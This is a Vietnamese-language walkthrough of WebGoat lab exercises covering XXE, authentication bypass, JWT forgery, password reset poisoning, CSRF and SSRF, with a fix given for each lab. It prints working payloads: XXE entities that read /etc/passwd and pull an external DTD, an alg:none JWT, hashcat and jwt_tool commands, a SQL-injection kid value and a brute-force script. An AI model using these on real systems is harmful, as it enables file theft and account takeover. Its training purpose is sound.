    var xif = XMLInputFactory.newInstance();

    if (webSession.isSecurityEnabled()) {
      xif.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, ""); // Compliant
      xif.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, ""); // compliant
    }

    var xsr = xif.createXMLStreamReader(new StringReader(xml));

    var unmarshaller = jc.createUnmarshaller();
    return (Comment) unmarshaller.unmarshal(xsr);
  }
  // ...
```

## POC

- Bắt một request khi gửi Review

![image.png]((A5)%20XXE%2058277b7d0c6d4f15adfeb53b34cfb880/image.png)

- Thêm DTD vào phần xml của request để có thể đọc được file /etc/passwd

```xml
<?xml version="1.0"?>
<!DOCTYPE text [
  <!ENTITY payload SYSTEM "file:///etc/passwd">
]>
<comment>  
	<text>&payload;</text>
</comment>
```

- Gửi request đi

![image.png]((A5)%20XXE%2058277b7d0c6d4f15adfeb53b34cfb880/image%201.png)

## Cách khắc phục

- Kiểm tra lại input XML được gửi đến từ phía client để xem có bị tấn công XXE hay không
- Tắt tính năng DTD của XML

```java
protected Comment parseXml(String xml) throws XMLStreamException, JAXBException {
    var jc = JAXBContext.newInstance(Comment.class);
    var xif = XMLInputFactory.newInstance();

    xif.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, ""); // Compliant
    xif.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, ""); // compliant
    xif.setProperty(XMLInputFactory.SUPPORT_DTD, false); // Disable DTDs entirely
    xif.setProperty("javax.xml.stream.isSupportingExternalEntities", false); // Prevent external entities

    var xsr = xif.createXMLStreamReader(new StringReader(xml));

    var unmarshaller = jc.createUnmarshaller();
    return (Comment) unmarshaller.unmarshal(xsr);
  }
```

# XXE 7

## Nguyên nhân lỗi

- Lập trình viên sử dụng cả 2 Content-Type là `application/json` và `application/xml` cho dữ liệu được gửi đến từ phía Client. Tuy nhiên khi xử lý Content-Type là **application/xml**, thì lập trình viên lại mắc phải lỗi như **XXE 1**

## POC

- Bắt một request khi gửi Review. Lúc này Content-Type là `application/json`

![image.png]((A5)%20XXE%2058277b7d0c6d4f15adfeb53b34cfb880/image%202.png)

- Đổi Content-Type thành `application/xml` , và Body thành xml như dưới

```xml
<?xml version="1.0"?>
<!DOCTYPE text [
  <!ENTITY payload SYSTEM "file:///etc/passwd">
]>
<comment>  
	<text>&payload;</text>
</comment>
```

- Send request và bypass

![image.png]((A5)%20XXE%2058277b7d0c6d4f15adfeb53b34cfb880/image%203.png)

## Cách khắc phục

- Như của XXE 4

# XXE 11

## Nguyên nhân lỗi

- Nguyên nhân chính dẫn đến lỗi vẫn như 2 lab trên, tuy nhiên ở lab này có thêm logic để không hiển thị nội dung file cần đọc nếu như phát hiện “**nội dung của file cần đọc có chứa nội dung của comment”**
- Chính việc so sánh này dẫn đến việc hacker có thể chèn thêm một nội dung trong payload tấn công XXE để nó không là chuỗi con của file cần đọc và có thể bypass được logic này.

```java
Comment comment = comments.parseXml(commentStr);
if (fileContentsForUser.contains(comment.getText())) {
  comment.setText("Nice try, you need to send the file to WebWolf");
}
comments.addComment(comment, false);
```

## POC

- Tạo một file DTD có nội dung bên dưới và upload lên WebWolf để host. DTD này có nhiệm vụ là sẽ đọc nội dung file secret.txt và lưu trữ vào entity secret.

![image.png]((A5)%20XXE%2058277b7d0c6d4f15adfeb53b34cfb880/image%204.png)

- Bắt Request và injection payload XXE như bên dưới

![image.png]((A5)%20XXE%2058277b7d0c6d4f15adfeb53b34cfb880/image%205.png)

- Entity blindxxe được sử dụng để inject dtd ở phía trên đang được host ở WebWolf - Chính là nội dung file cần đọc đã được lưu trong entity `secret` .
- Lúc này chỉ cần chèn thêm một chuỗi bất kỳ để nội dung được gửi đến server sẽ không là chuỗi con của nội dung file `secret.txt`.

```xml
<?xml version="1.0"?>
<!DOCTYPE xxe [
<!ENTITY % blindxxe SYSTEM "http://localhost:9090/WebWolf/files/shr3wd/test4.dtd">
%blindxxe;
]>
<comment><text>secret &secret;</text></comment>
```

- Gửi request và reload lại trang để đọc được nội dung của file trong phần comment.

![image.png]((A5)%20XXE%2058277b7d0c6d4f15adfeb53b34cfb880/image%206.png)
# (A6) Vulnerable Components
# (A7) Identity & Auth Failure

# **Authentication Bypasses**

### Nguyên nhân lỗi

- Lập trình viên mắc phải lỗi trong việc xây dựng logic kiểm tra câu hỏi bảo mật

```java
public boolean verifyAccount(Integer userId, HashMap<String, String> submittedQuestions) {
    // short circuit if no questions are submitted
    if (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) {
      return false;
    }

    if (submittedQuestions.containsKey("secQuestion0")
        && !submittedQuestions
            .get("secQuestion0")
            .equals(secQuestionStore.get(verifyUserId).get("secQuestion0"))) {
      return false;
    }

    if (submittedQuestions.containsKey("secQuestion1")
        && !submittedQuestions
            .get("secQuestion1")
            .equals(secQuestionStore.get(verifyUserId).get("secQuestion1"))) {
      return false;
    }

    // else
    return true;
  }
```

- Ở đây, lập trình viên chỉ kiểm tra khi mà trong danh sách các câu hỏi có `secQuestion0` và `secQuestion1` , có nghĩa nếu không có 2 câu hỏi trên thì giá trị  trả về của hàm `verifyAccount` luôn là `True`

### POC

- Bắt một request và gửi nó đến Repeater

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image.png)

- Thay đổi `secQuestion0` thành `secQuestion2` và `secQuestion1` thành `secQuestion3`  rồi gửi request

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%201.png)

### Cách khắc phục

- Thay đổi logic kiểm tra

```java
public boolean verifyAccount(Integer userId, HashMap<String, String> submittedQuestions) {
    // short circuit if no questions are submitted
    bool check = false;
    if (submittedQuestions.entrySet().size() != secQuestionStore.get(verifyUserId).size()) {
      return false;
    }

    if ((submittedAnswers.containsKey("secQuestion0")
            && submittedAnswers
                .get("secQuestion0")
                .equals(secQuestionStore.get(verifyUserId).get("secQuestion0")))
        && (submittedAnswers.containsKey("secQuestion1")
            && submittedAnswers
                .get("secQuestion1")
                .equals(secQuestionStore.get(verifyUserId).get("secQuestion1")))) {
      check = true;
    }

    return check;
  }
```

# Insecure Login

- Khi nhấn vào nút `Log in`  và bắt lại request thì nhận được một credential như sau

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%202.png)

```json
{"username":"CaptainJack","password":"BlackPearl"}
```

- Dùng thông tin này để đăng nhập vào để bypass

# JWT tokens

## Lab 4

- Sử dụng tính năng JWT trong WebWolf để decode token này và thu được username là: `user`

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%203.png)

## Lab 6

### Nguyên nhân lỗi

- Lập trình viên không kiểm tra tính toàn vẹn của token khi nhận được từ phía client, mà chỉ giải mã sau đó lấy phần body để xử lý tiếp các logic khác.

```java
Jwt jwt = Jwts.parser().setSigningKey(JWT_PASSWORD).parse(accessToken);
Claims claims = (Claims) jwt.getBody();
String user = (String) claims.get("user");
if ("Guest".equals(user) || !validUsers.contains(user)) {
  value.setSerializationView(Views.GuestView.class);
} else {
  value.setSerializationView(Views.UserView.class);
}
```

- Điều này khiến cho token có thể bị thay đổi và dữ liệu có thể thay đổi, khiến cho hacker có thể dễ dàng chiếm quyền và thay đổi thông tin để thực hiện các biện pháp tấn công khác.

### POC

- Đổi sang một người dùng khác thì sẽ nhận được một access_token, parse nó vào JWT của WebWolf

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%204.png)

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%205.png)

- Thay đổi `alg` thành `none` và `admin` thành `true` . Sau đó copy mã token mới được tạo lại

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%206.png)

- `eyJhbGciOiJub25lIn0.ew0KICAiYWRtaW4iIDogInRydWUiLA0KICAiaWF0IiA6IDE3MjQ0MDUyMjMsDQogICJ1c2VyIiA6ICJUb20iDQp9.`
- Thay mã token này vào, rồi thực hiện request đến `/votings`

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%207.png)

### Cách khắc phục

- Xác thực lại tính toàn vẹn của token

```java
try {
    Jwt<Claims> jwt = Jwts.parserBuilder()
        .setSigningKey(JWT_PASSWORD)
        .build()
        .parseClaimsJws(accessToken);
    
    Claims claims = jwt.getBody();
    String user = claims.get("user", String.class);

    if ("Guest".equals(user) || !validUsers.contains(user)) {
        value.setSerializationView(Views.GuestView.class);
    } else {
        value.setSerializationView(Views.UserView.class);
    }
} catch (JwtException e) {
    logger.error("JWT parsing error: ", e);
    value.setSerializationView(Views.GuestView.class);
}

```

## Lab 11

- Sử dụng tool `hashcat` để crack token này

```bash
hashcat token -m 16500 -a 3 -w 3 /usr/share/wordlist/rockyou.txt
```

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%208.png)

→ Tìm được key là `washington`

- Đưa token gốc vào JWT của WebGoat, sau đó dán key vào để lấy được token mới.
- Send token này và bypass lab này.

## Lab 13

> Để bypass được bài này có thể sử dụng cách như Lab 6 để chỉnh sửa token được ghi lại trong log.
> 

### Nguyên nhân lỗi

- Không kiểm tra `refreshToken` có phải là refreshToken của người dùng cần thực hiện hành vi làm mới token không. Điều này khiến cho hacker có thể sử dụng một `refreshToken` hợp lệ nhưng của một người dùng khác để thực hiện việc cấp lại `access_token` của tài khoản target.

```java
try {
  Jwt<Header, Claims> jwt =
      Jwts.parser().setSigningKey(JWT_PASSWORD).parse(token.replace("Bearer ", ""));
  user = (String) jwt.getBody().get("user");
  refreshToken = (String) json.get("refresh_token");
} catch (ExpiredJwtException e) {
  user = (String) e.getClaims().get("user");
  refreshToken = (String) json.get("refresh_token");
}

if (user == null || refreshToken == null) {
  return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
} else if (validRefreshTokens.contains(refreshToken)) {
  validRefreshTokens.remove(refreshToken);
  return ok(createNewTokens(user));
} else {
  return ResponseEntity.status(HttpStatus.UNAUTHORIZED).build();
}
```

### POC

- Khi đăng nhập thì `access_token` và `refresh_token` sẽ được khởi tạo cho người dùng bằng hàm `createNewTokens` .

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%209.png)

- Trong hàm này refreshToken khi được khởi tạo sẽ được lưu vào mảng `*validRefreshTokens` .* Mảng này sẽ được sử dụng để kiểm tra `refreshToken` có hợp lệ không khi thực hiện việc làm mới - cấp lại `access_token` .

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2010.png)

- Lúc này, chỉ cần đăng nhập bằng tài khoản `Jerry` để lấy được `refreshToken` và để lưu nó và trong mảng `validRefrshTokens` → phục vụ cho việc attack cấp lại `accessToken` cho người dùng `Tom`.

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2011.png)

- Thực hiện request đến `/newToken` cùng với `refresh_token` trên, cùng với token trên header Authorization đã được thay đổi để user thành `Tom` để lấy được `access_token`mới của tài khoản `Tom` .

![Ở đây, logic code lại mắc phải lỗi đơn giản chỉ lấy data từ phần body của json web token mà không kiểm tra tính hợp lệ của token này → Điều này khiến cho việc giả mạo token để thay đổi trường data user vẫn có thể xảy ra (Tương tự như Lab 6)]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2012.png)

Ở đây, logic code lại mắc phải lỗi đơn giản chỉ lấy data từ phần body của json web token mà không kiểm tra tính hợp lệ của token này → Điều này khiến cho việc giả mạo token để thay đổi trường data user vẫn có thể xảy ra (Tương tự như Lab 6)

![Thay đổi user thành `Tom`]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2013.png)

Thay đổi user thành `Tom`

![Thực hiện việc tạo mới `access_token` của user `Tom` ]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2014.png)

Thực hiện việc tạo mới `access_token` của user `Tom` 

- Lấy `access_token` mới này thay thế cho token của `Jerry` ở phần header `Authorization` và thực hiện gửi request.

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2015.png)

### Cách khắc phục

- Kiểm tra `refresh_token` có hợp lệ hay không, có phải token thuộc về người dùng thực hiện việc yêu cầu cấp `access_token` mới
    - Ở trong đoạn code này, có thể thay đổi `*validRefreshTokens`* thành kiểu HashMap.
    - Thực hiện việc xác định tính hợp lệ của `access_token`ở đoạn code này
    
    ![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2016.png)
    

## Lab 16

### Nguyên nhân lỗi

- Việc trích xuất URL `jku` từ header của token và sử dụng nó để tạo `JwkProvider` là rất nguy hiểm. Điều này cho phép kẻ tấn công đưa URL độc hại vào `jku`, từ đó có thể thực hiện các tấn công thay đổi jku để có thể xác thực mã token

### POC

- Gửi một request thực hiện việc xóa user Tom và bắt request này lại

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2017.png)

- Ở đây đường dẫn bị sai, chỉnh `final` thành `jku` .
- Có thể thấy được có một mã token được gửi kèm trong request
- Dùng JWT của WebWolf để phân tích token này

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2018.png)

- Ở đây chúng ta sẽ đổi `jku` thành một địa chỉ mà chúng ta host file `jwks.json` (Dùng WebWolf để host file này), `username` đổi thành Tom và chỉnh `exp` thành một ngày hợp lệ.

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2019.png)

- Sử dụng một tool để tạo token mới dựa vào jku mới - https://github.com/ticarpi/jwt_tool

```bash
python jwt_tool.py eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vY29nbml0by1pZHAudXMtZWFzdC0xLmFtYXpvbmF3cy5jb20vd2ViZ29hdC8ud2VsbC1rbm93bi9qd2tzLmpzb24iLCJ0eXAiOiJKV1QifQ.ew0KICAiRW1haWwiIDogImplcnJ5QHdlYmdvYXQuY29tIiwNCiAgIlJvbGUiIDogWyAiQ2F0IiBdLA0KICAiYXVkIiA6ICJ3ZWJnb2F0Lm9yZyIsDQogICJleHAiIDogMTgxODkwNTMwNCwNCiAgImlhdCIgOiAxNTI0MjEwOTA0LA0KICAiaXNzIiA6ICJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLA0KICAic3ViIiA6ICJqZXJyeUB3ZWJnb2F0LmNvbSIsDQogICJ1c2VybmFtZSIgOiAiVG9tIg0KfQ. -X s
 -ju http://127.0.0.1:9090/WebWolf/files/shr3wd/jwks.json
```

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2020.png)

- Sau khi chạy có một file jwks.json cũng được tạo ra, upload nó lên WebWolf để host.
- Copy token vừa được gen và thay vào rồi gửi request

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2021.png)

### Cách khắc phục

- Kiểm tra JKU có nằm trong whitelist được cho phép hay không thì mới thực hiện việc kiểm tra

## Lab 18

### Nguyên nhân lỗi

- KID được lấy từ token được chèn thẳng vào trong câu lệnh SQL, điều này khiến cho việc kẻ tấn công có thể chèn payload để thực hiện SQL Injection
- Kết hợp lỗi SQL Injection có thể giả mạo một KID hợp lệ - mặc dù key không tồn tại trong database

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2022.png)

### POC

- Thực hiện bắt một request delete tài khoản Tom, nó sẽ có một Token được gửi kèm như Lab 16.
- Sử dụng JWT trong WebGoat để phân tích Token này.
- Đổi trường `username` thành `Tom`, `exp` thành một giá trị hợp lệ (Lớn hơn ngày hiện tại)
- Đổi giá trị của trường kid thành payload để thực hiện SQL Injection giả mạo một key hợp lệ (Key ở đây sẽ chọn ngẫu nhiên - ở đây sẽ là `key` và key này sẽ được mã hóa base64 như logic của đoạn code)

```bash
qwert' UNION SELECT 'a2V5' FROM INFORMATION_SCHEMA.SYSTEM_TABLES; —
```

- Sau đó điền vào secret giá trị là key mà mình chọn - `key`

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2023.png)

- Thay token mới này và thực hiện request và bypass được.

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2024.png)

### Cách khắc phục

- Sử dụng Prepared Statements để thay thế cho việc truyền tham số vào trực tiếp như trên để phòng chống SQL Injection

```java
public byte[] resolveSigningKeyBytes(JwsHeader header, Claims claims) {
    final String kid = (String) header.get("kid");
    String query = "SELECT key FROM jwt_keys WHERE id = ?";
    
    try (var connection = dataSource.getConnection();
         PreparedStatement preparedStatement = connection.prepareStatement(query)) {
        
        preparedStatement.setString(1, kid);
        try (ResultSet rs = preparedStatement.executeQuery()) {
            if (rs.next()) {
                return TextCodec.BASE64.decode(rs.getString("key"));
            }
        }
    } catch (SQLException e) {
        errorMessage[0] = e.getMessage();
    }
    
    return null;
}

```

# Password Reset

## Lab 4

### Nguyên nhân lỗi

- Câu hỏi bảo mật quá dễ đoán, có thể bruteforce để tìm được.

### POC

- Để bruteforce nhanh hơn, code một đoạn code python như bên dưới.

```python
import requests

colors = ["red", "blue", "green", "yellow", "orange", "purple", 
"pink", "brown", "black", "white", "gray", "cyan", "magenta", "lime", "teal", 
"lavender", "maroon", "navy", "olive", "coral", "turquoise", "violet", "gold", "silver", 
"beige", "tan", "peach", "mint", "indigo", "aqua"]

account = ['tom', 'admin', 'larry']

headers = {  
    'Cookie': 'JSESSIONID=0FuKaJFAXbU6Yrw7EPUG24t4MySLL7BSwNIuQ18_'
}  

URL = "http://localhost:8080/WebGoat/PasswordReset/questions"

for acc in account:
    # username=fqw&securityQuestion=fqw
    for color in colors:
        data = {
            "username": acc,
            "securityQuestion": color
        }
        response = requests.post(URL, data=data, headers=headers)
        json = response.json()
        if "Sorry the solution is not correct" not in json["feedback"]:
            print(f"[+] Username: {acc}")
            print(f"[=>] Security Question: {color}")
            break
```

- Chạy payload và thu được các câu hỏi bảo mật đúng của từng tài khoản người dùng

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2025.png)

### Cách khắc phục

- Để các câu hỏi bảo mật khó đoán và không có một danh sách trả lời cố định.
    - Ví dụ:
    - **Tên của con vật nuôi đầu tiên của bạn là gì?**
    - **Tên trường tiểu học mà bạn đã học là gì?**
    - **Tên của người bạn thân nhất thời thơ ấu của bạn là gì?**
    - **Tên thành phố nơi bạn sinh ra là gì?**
    - **Tên trường trung học mà bạn đã tốt nghiệp là gì?**

## Lab 6

### Nguyên nhân lỗi

- Không kiểm tra kỹ hết các header được sử dụng cho việc tạo link reset mật khẩu → Điều này khiến cho hacker có thể thao túng đường dẫn reset password và tạo ra một url giả để chiếm được đường dẫn reset password của người dùng.

```java
	public AttackResult sendPasswordResetLink(
	  @RequestParam String email, HttpServletRequest request) {
	String resetLink = UUID.randomUUID().toString();
	ResetLinkAssignment.resetLinks.add(resetLink);
	String host = request.getHeader(HttpHeaders.HOST);
	if (ResetLinkAssignment.TOM_EMAIL.equals(email)
	    && (host.contains(webWolfPort)
	        && host.contains(webWolfHost))) { // User indeed changed the host header.
	  ResetLinkAssignment.userToTomResetLink.put(getWebSession().getUserName(), resetLink);
	  fakeClickingLinkEmail(webWolfURL, resetLink);
	} else {
	  try {
	    sendMailToUser(email, host, resetLink);
	  } catch (Exception e) {
	    return failed(this).output("E-mail can't be send. please try again.").build();
	  }
	}
	
	return success(this).feedback("email.send").feedbackArgs(email).build();
	}
```

- Cụ thể ở đây là header HOST không được dùng để kiểm tra phần ip lẫn phần port. Điều này khiến việc tấn công có thể xảy ra bằng cách thay đổi đường dẫn được gửi đến người dùng. Khi người dùng nhấn vào đường dẫn Reset trong mail thì hacker có thể cướp được mã reset password này.

### POC

- Gửi một request để yêu cầu reset password, dùng burp suite để bắt lại request này.
- Thay đổi header `HOST`  thành host của WebWolf, thay đổi email thành email của nạn nhân (Ở đây là tom - [tom@webgoat-cloud.org](mailto:tom@webgoat-cloud.org)).
- Gửi Request và đợi Tom nhấn vào đường dẫn đổi mật khẩu.

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2026.png)

- Vào phần `/requests` của WebWolf và thấy một request reset mật khẩu

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2027.png)

- Dùng đường dẫn này, đổi port lại thành 8080 để truy cập vào trang đổi mật khẩu thật. Thay đổi mật khẩu và mật khẩu của tài khoản Tom sẽ bị thay đổi.

![image.png]((A7)%20Identity%20&%20Auth%20Failure%20ecda853d23ed41a8bd81e356f36b18e3/image%2028.png)

### Cách khắc phục

- **Kiểm tra và xác thực tiêu đề `Host`:** Đảm bảo rằng tiêu đề `Host` được xác thực và chỉ chấp nhận từ các nguồn đáng tin cậy.

```java
public AttackResult sendPasswordResetLink(
      @RequestParam String email, HttpServletRequest request) {
    String resetLink = UUID.randomUUID().toString();
    ResetLinkAssignment.resetLinks.add(resetLink);
    String host = request.getHeader(HttpHeaders.HOST);
    String expectedHost = "yourtrustedhost.com";
    if (ResetLinkAssignment.TOM_EMAIL.equals(email)
        && (host.contains(webWolfPort)
            && host.contains(webWolfHost))) { // User indeed changed the host header.
      ResetLinkAssignment.userToTomResetLink.put(getWebSession().getUserName(), resetLink);
      fakeClickingLinkEmail(webWolfURL, resetLink);
    } else {
      try {
        if (hostHeader == null || !hostHeader.equalsIgnoreCase(expectedHost)) {
		      return failed(this).output("Invalid host header.").build();  
        } else {
	        sendMailToUser(email, host, resetLink);
	      }
      } catch (Exception e) {
        return failed(this).output("E-mail can't be send. please try again.").build();
      }
    }

    return success(this).feedback("email.send").feedbackArgs(email).build();
  }
```

# Secure Password

- Nhập một mật khẩu có chứ ký tự viết hoa, chữ thường, ký tự số và ký tự đặc biệt
- Vi dụ: Test99482@1231!
# (A8) Insecure Deserialization
# (A9) Security Logging Failures

# **Logging Security**

## Lab 2

- Ở đây, chỉ cần đăng nhập vào với username là `admin`  để được lưu vào trong log là được.

→ Mục đích của lỗ hổng này là nếu như có một tính năng đọc log hoặc hiển thị log mà không được filter kỹ thì sẽ có thể chèn được các payload tấn công liên quan đến injection vào hệ thống.

## Lab 4

- Khi boot một máy chủ, mật khẩu của admin sẽ được hiển thị trong log.
- Chỉ cần lấy password này ở trong log, tuy nhiên password đã bị mã hóa. Cụ thể là bị mã hóa Base64

```java
@PostConstruct
public void generatePassword() {
  password = UUID.randomUUID().toString();
  log.info(
      "Password for admin: {}",
      Base64.getEncoder().encodeToString(password.getBytes(StandardCharsets.UTF_8)));
}
```

- Giải mã và đăng nhập lại với tài khoản mà mật khẩu `Admin:<decoded password>`
[(A10) Server-side Request Forgery]((A10)%20Server-side%20Request%20Forgery.md)
# (A10) Server-side Request Forgery

# Cross-Site Request Forgeries

## **Basic Get CSRF Exercise**

### Nguyên nhân lỗi:

- Phía server chỉ đơn giản là kiểm tra dựa vào header Referer mà không sử dụng thêm csrf token để phòng tránh bị tấn công CSRF, điều này khiến cho hacker có thể thay đổi Referer để có thể thực hiện tấn công CSRF.

```java
// ...
String host = (req.getHeader("host") == null) ? "NULL" : req.getHeader("host");
String referer = (req.getHeader("referer") == null) ? "NULL" : req.getHeader("referer");
String[] refererArr = referer.split("/");
// ...
if (referer.equals("NULL")) {
	  if ("true".equals(req.getParameter("csrf"))) {
	    Random random = new Random();
	    userSessionData.setValue("csrf-get-success", random.nextInt(65536));
	    response.put("success", true);
	    response.put("message", pluginMessages.getMessage("csrf-get-null-referer.success"));
	    response.put("flag", userSessionData.getValue("csrf-get-success"));
	  } else {
	    Random random = new Random();
	    userSessionData.setValue("csrf-get-success", random.nextInt(65536));
	    response.put("success", true);
	    response.put("message", pluginMessages.getMessage("csrf-get-other-referer.success"));
	    response.put("flag", userSessionData.getValue("csrf-get-success"));
	  }
} else if (refererArr[2].equals(host)) {
  response.put("success", false);
  response.put("message", "Appears the request came from the original host");
  response.put("flag", null);
} else {
  Random random = new Random();
  userSessionData.setValue("csrf-get-success", random.nextInt(65536));
  response.put("success", true);
  response.put("message", pluginMessages.getMessage("csrf-get-other-referer.success"));
  response.put("flag", userSessionData.getValue("csrf-get-success"));
}
// ...
```

### POC

- Có 2 cách để tấn công CSRF vào assign này:
    - Thay đổi header Referer để nó khác với Host
    - Xóa header Referer khỏi Request
1. **Thay đổi header Referer để nó khác với Host**
- Ở đoạn code này, chương trình thực hiện so sánh 2 giá trị của 2 header là Host và Referer, nếu 2 giá trị như nhau thì không hợp lệ.

![Untitled]((A10)%20Server-side%20Request%20Forgery%2054155e768c9b4d2989d35bea13b9666c/Untitled.png)

- Thực hiện bắt request lại và thay đổi header `Referer`  sang giá trị khác với `Host`
- Hoặc tạo một file html với request form đến trang gốc lên WebWolf sau đó gửi form.

![Untitled]((A10)%20Server-side%20Request%20Forgery%2054155e768c9b4d2989d35bea13b9666c/Untitled%201.png)

1. **Xóa header Referer khỏi Request**
- Ở đoạn code này, khi header `Referer` rỗng thì chương trình sẽ kiểm tra giá trị của tham số `csrf` . Nếu giá trị này là `true` hoặc không thì chương trình vẫn sẽ trả về flag.

![Untitled]((A10)%20Server-side%20Request%20Forgery%2054155e768c9b4d2989d35bea13b9666c/Untitled%202.png)

### Cách khắc phục

- Sử dụng Allow List để xác thực header Referer
- Tạo ra một mã csrfToken để xác thực, tránh việc bị tấn công CSRF. Không dựa vào header Referer

## **Post a review on someone else’s behalf**

### Nguyên nhân lỗi

Như ở bài lab trên

### POC

- Gửi một review, sau đó dùng burp suite để bắt request này và gửi đến Repeater để chỉnh sửa.
- Thay đổi header Referer thành một địa chỉ IP khác rồi gửi request

![image.png]((A10)%20Server-side%20Request%20Forgery%2054155e768c9b4d2989d35bea13b9666c/image.png)

### Cách khắc phục

## **CSRF and content-type**

### Nguyên nhân lỗi

- Như 2 lab trên, vẫn do việc không kiểm tra kỹ các header của request

```java
// ...
private boolean hostOrRefererDifferentHost(HttpServletRequest request) {
    String referer = request.getHeader("Referer");
    String host = request.getHeader("Host");
    if (referer != null) {
      return !referer.contains(host);
    } else {
      return true;
    }
  }
  // ...
```

- Ở lab này, chương trình có check lại header Content-Type phải là kiểu `text/plain` .

![image.png]((A10)%20Server-side%20Request%20Forgery%2054155e768c9b4d2989d35bea13b9666c/image%201.png)

### POC

- Thực hiện bắt một request khi gửi một Feedback, sau đó gửi request này sang Repeater để chỉnh sửa.
- Thay đổi Content-Type thành text
- Thay đổi Referer khác với Host
- Gửi request để bypass

![image.png]((A10)%20Server-side%20Request%20Forgery%2054155e768c9b4d2989d35bea13b9666c/image%202.png)

# **Server-Side Request Forgery**

### Nguyên nhân lỗi

- Thiếu Kiểm Tra URL Đầu Vào: Mã này nhận một URL thông qua tham số url mà không thực hiện kiểm tra bảo mật hoặc xác thực URL đầu vào. Điều này có thể dẫn đến một lỗ hổng SSRF nếu mã thực hiện các yêu cầu HTTP tới URL không đáng tin cậy.
- Hạn Chế URL Không Đủ: Mặc dù mã này chỉ kiểm tra hai URL cụ thể (images/tom.png và images/jerry.png), nhưng nếu mã không hạn chế đúng cách và không có biện pháp bảo vệ khác, nó có thể dễ bị tấn công nếu có thể lợi dụng để thực hiện yêu cầu tới các dịch vụ nội bộ khác.

### POC

- Thực hiện request để lấy tài nguyên là tom.png, dùng burp suite để bắt request này.
- Thay đổi tham số url từ `images%2Ftom.png` thành `images%2Fjerry.png` rồi send request

![image.png]((A10)%20Server-side%20Request%20Forgery%2054155e768c9b4d2989d35bea13b9666c/image%203.png)

- Thay đổi URL thành một URL khác để truy cập vào tài nguyên - thực hiện tấn công SSRF, ở đây sẽ là [**http://ifconfig.pro**](http://ifconfig.pro/)

![image.png]((A10)%20Server-side%20Request%20Forgery%2054155e768c9b4d2989d35bea13b9666c/image%204.png)

### Cách khắc phục

- Sử dụng White List để hạn chế việc bị tấn công SSRF
- Kiểm tra xác thực đầu vào của tham số URL
- Kiểm tra địa chỉ mạng nội bộ, đảm bảo URL không truy cập vào các địa chỉ nội bộ loopback
# Client side

# **Bypass front-end restrictions**

### Nguyên nhân lỗi (Chung)

- Đặt RegEx ở phía Client, khiến cho việc kiểm tra dễ dàng bypass.

## Lab 2

![image.png](Client%20side%20bda8571a44b14f59a7027e5dbff5574c/image.png)

- Gửi request, sau đó bắt request này và gửi sang Repeater.
- Thay đổi các trường dữ liệu thành các value nằm ngoài giá trị có sẵn. Sau đó gửi request để bypass

## Lab 3

- Gửi request và bắt request này lại gửi sang Repeater. Sau đó, thực hiện thay đổi các trường giá trị  thành các giá trị nằm ngoài regex và gửi request.

![image.png](Client%20side%20bda8571a44b14f59a7027e5dbff5574c/image%201.png)

### Cách khắc phục (Chung)

- Đặt Regex ở phía Client, sau đó nhận giá trị từ phía Client và sử lý thêm một lần nữa ở phía Server để chắc chắn dữ liệu được định dạng đúng với mong muốn của lập trình viên.

# **Client side filtering**

## Lab 2

### Nguyên nhân lỗi

- Server không sử dụng `userId` để kiểm tra và trả về đúng thông tin của `userId`  mà trả về tất cả thông tin của tất cả người dùng.

### POC

